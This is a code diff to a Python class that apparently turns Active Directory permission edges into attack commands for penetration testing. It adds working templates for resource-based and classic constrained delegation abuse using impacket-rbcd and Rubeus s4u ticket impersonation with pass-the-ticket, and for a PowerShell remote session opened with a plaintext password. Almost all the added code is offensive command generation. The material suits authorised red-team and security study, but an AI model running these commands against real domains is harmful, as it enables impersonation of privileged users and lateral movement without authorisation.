@@ -190,11 +190,36 @@ class CommandOracle:
         if normalized_edge in ("AddAllowedToAct", "AllowedToAct"):
             target_computer = target.name or "<TARGET_COMPUTER>"
             return (
-                "# AddAllowedToAct: configure RBCD on target computer object\n"
+                "# AllowedToAct / AddAllowedToAct: abuse resource-based constrained delegation (RBCD)\n"
                 f"impacket-rbcd{auth_part} -dc-ip <DC_IP> -action write "
                 f"-delegate-from '<CONTROLLED_COMPUTER>$' -delegate-to '{target_computer}' "
                 f"{domain}/{username}\n"
-                "# Follow up with S4U (Rubeus/getST) using delegated machine account"
+                "# Follow up with S4U to impersonate a user to the target service\n"
+                "Rubeus.exe s4u /user:<CONTROLLED_COMPUTER$> /rc4:<RC4_HASH> "
+                f"/impersonateuser:<TARGET_USER> /msdsspn:cifs/{target_computer} /ptt"
+            )
+
+        # AllowedToDelegate (classic constrained delegation)
+        if normalized_edge == "AllowedToDelegate":
+            target_host = target.name or "<TARGET_COMPUTER>"
+            return (
+                "# AllowedToDelegate: constrained delegation abuse via S4U2self/S4U2proxy\n"
+                "Rubeus.exe s4u /user:<DELEGATING_ACCOUNT> /rc4:<ACCOUNT_HASH> "
+                f"/impersonateuser:<TARGET_USER> /msdsspn:\"HTTP/{target_host}\" "
+                "/altservice:cifs /ptt\n"
+                "# Ticket can provide admin-level access if impersonating privileged user"
+            )
+
+        # CanPSRemote
+        if normalized_edge == "CanPSRemote":
+            target_host = target.name or "<TARGET_COMPUTER>"
+            return (
+                "# CanPSRemote: open remote PowerShell session and execute commands\n"
+                "$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force\n"
+                f"$Cred = New-Object System.Management.Automation.PSCredential('{domain}\\{username}', $SecPassword)\n"
+                f"$session = New-PSSession -ComputerName {target_host} -Credential $Cred\n"
+                "Invoke-Command -Session $session -ScriptBlock { whoami }\n"
+                "Disconnect-PSSession -Session $session; Remove-PSSession -Session $session"
             )
 
         # AddKeyCredentialLink (Shadow Credentials)
